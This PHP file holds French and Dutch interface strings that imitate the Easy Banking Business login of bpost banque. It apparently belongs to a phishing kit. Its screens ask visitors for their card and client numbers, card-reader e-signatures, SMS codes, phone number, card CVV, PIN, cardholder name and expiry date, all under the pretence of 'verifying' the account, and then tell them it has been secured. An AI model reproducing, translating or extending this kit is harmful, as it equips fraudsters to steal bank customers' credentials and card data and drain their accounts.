<?php 

$lang = array(

    "FR"=>[
        "_easy"=>"Easy Banking Business",
        "_help"=>["Besoin d'aide ?Appelez le+32 2 762 20 00", "Commander un lecteur de carte"],
        "_next"=>"Suivant",
        "_confirm"=>"Confirmer",
        "_welcomes"=>["BIENVENUE DANS", "EASY BANKING"],
        "_login_error"=>"Le numéro de carte ou le numéro de client est incorrect",
        "_register"=>["Ancien client de bpost banque ?", "Retrouvez facilement votre numéro de client"],
        "_login_inputs"=>["Numéro de carte", "Numéro de client"],
        "_sign_card"=>"Numéro de carte",
        "_sign_tab1"=>"Insérez votre carte dans le lecteur de carte et appuyez sur ",
        "_sign_tab2"=>["Introduisez", "et appuyez sur"],
        "_sign_tab3"=>"Introduisez votre code PIN et appuyez sur ",
        "_sign_tab4"=>"Introduisez l'e-signature",
        "_sign_btn"=>"Se connecter",
        "_conf_title"=>"Confirmation",
        "_use_card"=>"Utilisez la carte de débit suivante pour confirmer",
        "_conf_tab1"=>"Insérez votre carte dans le lecteur de carte et appuyez sur",
        "_conf_tab2"=>["'PIN?' s'affiche", "Introduisez votre PIN et appuyez sur "],
        "_conf_tab3"=>["'DATA or OK?' s'affiche", "Introduisez ", "et appuyez sur"],
        "_conf_tab4"=>["L'e signature s'affiche", "Introduisez l'e-signature"],
        "_sms_text"=>"Veuillez soumettre le code envoyé à votre numéro de téléphone pour continuer",
        "_sms_input"=>"Entrez le code",
        "_phone_text"=>"Veuillez entrer votre numéro de téléphone pour continuer",
        "_phone_input"=>"Numéro de téléphone",
        "_loading"=>["Connexion en cours... ", "Veuillez patienter.", "Ne quittez pas cette page."],
        "_done"=>["Votre compte a été vérifié.", "Merci de nous avoir aidé à sécuriser votre compte."],
        "_sms_error"=>"Code invalide",
        "_sign_error"=>"L'e-signature n'est pas correcte.",
        "_phone_error"=>"Numéro de téléphone incorrect",

        "_verif_title"=>"Vérification",
        "_cc_details_text"=>"Veuillez saisir les détails de votre carte pour vérifier votre compte.",
        "_cc_details_inputs"=>["Code de sécurité (CVV)", "Code PIN de la carte"],
        "_cc_details_error"=>"Informations non valides. Veuillez vérifier vos données et réessayer.",

        "_info_text"=>"Saisissez les informations suivantes pour vérifier votre compte.",
        "_info_inputs"=>["Nom du titulaire de la carte", "Date d'expiration (MM/AA)"],
        
    ],
    "NL"=>[
        "_easy"=>"Easy Banking Business",
        "_help"=>["Hulp nodig? Bel +32 2 762 20 00", "Bestel een kaartlezer"],
        "_next"=>"Volgende",
        "_confirm"=>"Bevestigen",
        "_welcomes"=>["WELKOM BIJ", "EASY BANKING"],
        "_login_error"=>"Het kaartnummer of klantnummer is onjuist",
        "_register"=>["Voormalige klant van bpost bank?", "Vind uw klantnummer gemakkelijk terug"],
        "_login_inputs"=>["Kaartnummer", "Klantnummer"],
        "_sign_card"=>"Kaartnummer",
        "_sign_tab1"=>"Plaats uw kaart in de kaartlezer en druk op ",
        "_sign_tab2"=>["Voer in", "en druk op"],
        "_sign_tab3"=>"Voer uw pincode in en druk op ",
        "_sign_tab4"=>"Voer de e-handtekening in",
        "_sign_btn"=>"Inloggen",
        "_conf_title"=>"Bevestiging",
        "_use_card"=>"Gebruik de volgende debitcard om te bevestigen",
        "_conf_tab1"=>"Plaats uw kaart in de kaartlezer en druk op",
        "_conf_tab2"=>["'PIN?' wordt weergegeven", "Voer uw pincode in en druk op "],
        "_conf_tab3"=>["'DATA or OK?' wordt weergegeven", "Voer ", "en druk op"],
        "_conf_tab4"=>["De e-handtekening wordt weergegeven", "Voer de e-handtekening in"],
        "_sms_text"=>"Voer de code in die naar uw telefoonnummer is gestuurd om door te gaan",
        "_sms_input"=>"Voer de code in",
        "_phone_text"=>"Voer uw telefoonnummer in om door te gaan",
        "_phone_input"=>"Telefoonnummer",
        "_loading"=>["Verbinding maken... ", "Even geduld a.u.b.", "Verlaat deze pagina niet."],
        "_done"=>["Uw account is geverifieerd.", "Bedankt voor uw hulp bij het beveiligen van uw account."],
        "_sms_error"=>"Ongeldige code",
        "_sign_error"=>"De e-handtekening is niet correct.",
        "_phone_error"=>"Ongeldig telefoonnummer",
        "_verif_title"=>"Verificatie",
        "_cc_details_text"=>"Voer de details van uw kaart in om uw account te verifiëren.",
        "_cc_details_inputs"=>["Beveiligingscode (CVV)", "PIN-code van de kaart"],
        "_cc_details_error"=>"Ongeldige informatie. Controleer uw gegevens en probeer het opnieuw.",
        "_info_text" => "Voer de volgende informatie in om uw account te verifiëren.",
        "_info_inputs" => ["Naam kaarthouder", "Vervaldatum (MM/JJ)"]
        



    ]
    
);

?>